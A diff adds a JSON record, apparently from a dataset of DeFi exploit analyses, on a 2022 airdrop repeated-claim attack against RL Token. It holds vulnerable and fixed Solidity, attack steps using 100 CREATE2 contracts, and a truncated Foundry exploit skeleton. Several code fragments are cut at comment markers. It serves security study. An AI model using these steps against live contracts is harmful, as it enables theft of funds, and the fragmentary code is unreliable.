@@ -1,0 +1,34 @@
+{
+ "id": "2022__2022-10_RL_AirdropMultiContractDrain",
+ "source_file": "2022/2022-10_RL_AirdropMultiContractDrain.md",
+ "title": "RL — CREATE2 Multi-Contract Airdrop Repeated Claim Attack Analysis",
+ "date": "2022-10-01",
+ "protocol": "RL Token",
+ "chain": "Binance Smart Chain",
+ "loss_raw": "Unconfirmed",
+ "loss_usd": null,
+ "root_cause": "`distributeAirdrop()` does not validate whether an address has already claimed the airdrop, allowing multiple contracts deployed via CREATE2 to claim repeatedly",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "staking-reward"
+ ],
+ "code_before": [
+  "❌ Vulnerable distributeAirdrop() - no duplicate claim prevention\ncontract RLLpIncentive {\n    mapping(address => uint256) public lpBalance;\n\n    function distributeAirdrop(address recipient) external {\n        //",
+  "❌ Does not check whether recipient has already claimed the airdrop\n        uint256 lpHeld = lpBalance[recipient];\n        require(lpHeld > 0, \"No LP\");\n\n        //",
+  "❌ Claim status is not recorded\n        uint256 reward = lpHeld * REWARD_RATE;\n        RL.transfer(recipient, reward);\n        // The same lpBalance can be used to re-claim on the next call\n    }\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct pattern - claim state tracking\ncontract SafeRLLpIncentive {\n    mapping(address => bool) public airdropClaimed;\n\n    function distributeAirdrop(address recipient) external {\n        //",
+  "✅ Block addresses that have already claimed\n        require(!airdropClaimed[recipient], \"Already claimed\");\n        uint256 lpHeld = lpBalance[recipient];\n        require(lpHeld > 0, \"No LP\");\n\n        airdropClaimed[recipient] = true; //"
+ ],
+ "steps": [
+  "[2] Swap USDT → RL + add liquidity → receive LP tokens",
+  "100 contracts × airdrop = massive RL received",
+  "[5] Remove liquidity (LP → USDT + RL)",
+  "[6] Sell RL → USDT"
+ ],
+ "other_code": [
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IRLLpIncentive {\n    function distributeAirdrop(address recipient) external;\n}\n\n// Airdrop claim contract deployed via CREATE2\ncontract AirDropRewardContract {\n    IRLLpIncentive incentive;\n    address owner;\n\n    constructor(address _incentive, address _lp) {\n        incentive = IRLLpIncentive(_incentive);\n        owner = msg.sender;\n        // Claim airdrop after receiving LP tokens\n    }\n\n    function airDropReward() external {\n        // Claim airdrop for this contract's own address\n        incentive.distributeAirdrop(address(this));\n        // Forward received RL to owner\n    }\n}\n\ncontract RLExploit is Test {\n    IRLLpIncentive incentive = IRLLpIncentive(0x335ddcE3f07b0bdaFc03F56c1"
+ ]
+}
